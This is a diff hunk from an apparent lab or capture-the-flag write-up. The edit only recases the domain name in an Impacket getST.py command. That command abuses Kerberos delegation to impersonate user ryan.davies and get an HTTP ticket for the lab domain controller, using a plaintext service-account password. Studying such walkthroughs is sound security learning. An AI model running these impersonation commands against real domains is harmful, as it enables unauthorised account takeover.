@@ -583,7 +583,7 @@ After starting up bloodhound and ingesting the data i can search the group, and 
 # Compromising `ryan.davies` through delegation
 
 ```python
-getST.py -self -impersonate ryan.davies -k 'lustrous2.vl/ShareSvc:#1Service' -altservice HTTP/lus2dc.lustrous2.vl
+getST.py -self -impersonate ryan.davies -k 'LUSTROUS2.VL/ShareSvc:#1Service' -altservice HTTP/lus2dc.lustrous2.vl
 Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating ryan.davies
